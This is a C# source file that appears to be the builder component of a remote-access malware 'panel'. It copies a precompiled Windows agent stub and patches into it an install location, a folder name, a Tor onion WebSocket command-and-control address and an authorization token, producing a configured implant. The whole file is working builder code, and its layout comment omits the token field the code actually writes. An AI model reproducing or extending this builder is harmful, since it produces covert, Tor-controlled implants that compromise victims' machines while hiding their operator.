using System;
using System.IO;
using System.Text;
using System.Security.Cryptography;
using System.Text.RegularExpressions;

namespace Valhalla
{
    internal static class AgentBuildService
    {
        // Magic sentinel written by the panel and read by the agent stub reader.
        // Must match MAGIC in agent/src/stub.rs exactly.
        private static readonly byte[] Magic = { (byte)'V', (byte)'L', (byte)'H',
                                                  (byte)'C', (byte)'F', (byte)'G',
                                                  0x00, 0x01 };

        private static readonly Regex OnionEndpoint = new Regex(
            @"^ws://(?<host>[a-z2-7]{56})\.onion:(?<port>[1-9][0-9]{0,4})(?<path>/[^\s]*)?$",
            RegexOptions.IgnoreCase | RegexOptions.CultureInvariant);

        /// <summary>
        /// Copies stub/stub.bin to <paramref name="outputPath"/> and patches the
        /// configuration block into the copy.  The original stub/stub.bin is
        /// never modified.
        /// </summary>
        public static void PatchAndDeploy(string onionAddress, int installDirectory,
                                          string folderName, string agentToken, string outputPath)
        {
            string normalizedEndpoint = ValidateOnionAddress(onionAddress);
            if (installDirectory < 0 || installDirectory > 4)
                throw new ArgumentOutOfRangeException(nameof(installDirectory),
                    "Install directory index must be 0–4.");
            if (string.IsNullOrWhiteSpace(folderName))
                folderName = "Einherjar";

            string stubPath = LocateStub();

            // Verify the source is a Windows PE.
            using (FileStream verify = File.OpenRead(stubPath))
            {
                if (verify.Length < 2)
                    throw new InvalidDataException("stub.bin is too small to be a valid PE.");
                int b0 = verify.ReadByte(), b1 = verify.ReadByte();
                if (b0 != 'M' || b1 != 'Z')
                    throw new InvalidDataException(
                        "stub.bin is not a valid Windows PE executable (missing MZ header).");
            }

            // Read the clean template — never touch this file again after reading.
            byte[] image = File.ReadAllBytes(stubPath);

            // Build the configuration block.
            if (string.IsNullOrWhiteSpace(agentToken))
                throw new ArgumentException("Relay agent authorization token is required.", nameof(agentToken));
            byte[] block = BuildConfigBlock(installDirectory, folderName, normalizedEndpoint, agentToken);

            // Find the magic sentinel in the image and write the block immediately after it.
            int offset = FindMagic(image);
            if (offset < 0)
                throw new InvalidDataException(
                    "stub.bin does not contain the Einherjar configuration sentinel. " +
                    "Ensure stub.bin was produced by the Einherjar build.");

            // Validate that the block fits in the space allocated after the sentinel.
            int payloadOffset = offset + Magic.Length;
            if (payloadOffset + block.Length > image.Length)
                throw new InvalidDataException(
                    "stub.bin configuration region is too small to hold the current settings.");

            // Write the configuration payload into the in-memory image.
            Buffer.BlockCopy(block, 0, image, payloadOffset, block.Length);

            // Write the patched image to the user-chosen output path.
            string dir = Path.GetDirectoryName(Path.GetFullPath(outputPath));
            if (!string.IsNullOrWhiteSpace(dir))
                Directory.CreateDirectory(dir);

            // Atomic-ish write: write to a temp file then move.
            string tmp = outputPath + ".tmp";
            File.WriteAllBytes(tmp, image);
            if (File.Exists(outputPath)) File.Delete(outputPath);
            File.Move(tmp, outputPath);
        }


        public static string DeriveAgentToken(string relaySecret)
        {
            if (string.IsNullOrEmpty(relaySecret))
                throw new ArgumentException("Relay authentication secret is required to derive the agent token.", nameof(relaySecret));
            using (var hmac = new HMACSHA256(Encoding.ASCII.GetBytes(relaySecret)))
            {
                byte[] material = Encoding.ASCII.GetBytes("VALHALLA-AGENT-AUTH-V1\0");
                return BitConverter.ToString(hmac.ComputeHash(material)).Replace("-", string.Empty).ToLowerInvariant();
            }
        }

        public static string ValidateOnionAddress(string value)
        {
            string endpoint = (value ?? string.Empty).Trim();
            Match match = OnionEndpoint.Match(endpoint);
            if (!match.Success)
                throw new ArgumentException(
                    "Onion address must be a ws:// v3 onion endpoint such as " +
                    "ws://<56-character-onion-host>:443/valhalla.", nameof(value));
            int port = int.Parse(match.Groups["port"].Value,
                System.Globalization.CultureInfo.InvariantCulture);
            if (port < 1 || port > 65535)
                throw new ArgumentException(
                    "Onion endpoint port must be between 1 and 65535.", nameof(value));
            return endpoint;
        }

        // ── Internal helpers ─────────────────────────────────────────────────

        /// <summary>
        /// Builds the raw byte payload that follows the magic sentinel:
        ///   [0]         install_dir : u8
        ///   [1..2]      folder_len  : u16 LE
        ///   [3..]       folder_name : UTF-8
        ///   [n+0..n+1]  onion_len   : u16 LE
        ///   [n+2..]     onion       : UTF-8
        /// Must match the parser in agent/src/stub.rs exactly.
        /// </summary>
        private static byte[] BuildConfigBlock(int installDir, string folderName, string onion, string agentToken)
        {
            byte[] folderBytes = Encoding.UTF8.GetBytes(folderName);
            byte[] onionBytes  = Encoding.UTF8.GetBytes(onion);
            byte[] tokenBytes  = Encoding.UTF8.GetBytes(agentToken.Trim());

            if (folderBytes.Length > 260)
                throw new ArgumentException("Folder name is too long (max 260 UTF-8 bytes).");
            if (onionBytes.Length > 512)
                throw new ArgumentException("Onion address is too long (max 512 UTF-8 bytes).");
            if (tokenBytes.Length == 0 || tokenBytes.Length > 256)
                throw new ArgumentException("Relay agent authorization token must be 1–256 UTF-8 bytes.");

            using (var ms = new MemoryStream())
            using (var bw = new BinaryWriter(ms, Encoding.UTF8, leaveOpen: true))
            {
                bw.Write((byte)installDir);
                bw.Write((ushort)folderBytes.Length);
                bw.Write(folderBytes);
                bw.Write((ushort)onionBytes.Length);
                bw.Write(onionBytes);
                bw.Write((ushort)tokenBytes.Length);
                bw.Write(tokenBytes);
                bw.Flush();
                return ms.ToArray();
            }
        }

        private static int FindMagic(byte[] image)
        {
            int limit = Math.Min(image.Length - Magic.Length, 64 * 1024 * 1024);
            for (int i = 0; i <= limit; i++)
            {
                bool match = true;
                for (int j = 0; j < Magic.Length && match; j++)
                    match = image[i + j] == Magic[j];
                if (match) return i;
            }
            return -1;
        }

        private static string LocateStub()
        {
            // 1. Explicit environment override.
            string env = Environment.GetEnvironmentVariable("VALHALLA_STUB_PATH");
            if (!string.IsNullOrWhiteSpace(env) && File.Exists(env))
                return Path.GetFullPath(env);

            // 2. Walk up from the panel executable directory looking for stub\stub.bin.
            //    Depth 0 catches the CI layout where stub.bin is embedded directly
            //    alongside the panel executable at <output>\stub\stub.bin.
            //    Deeper depths catch the source-tree layout <repo-root>\stub\stub.bin.
            DirectoryInfo current = new DirectoryInfo(AppDomain.CurrentDomain.BaseDirectory);
            for (int depth = 0; current != null && depth < 8; depth++, current = current.Parent)
            {
                string candidate = Path.Combine(current.FullName, "stub", "stub.bin");
                if (File.Exists(candidate)) return candidate;
            }

            throw new FileNotFoundException(
                "stub/stub.bin was not found. Place the pre-compiled Einherjar binary at " +
                "stub\\stub.bin alongside the panel executable, or set VALHALLA_STUB_PATH.");
        }
    }
}
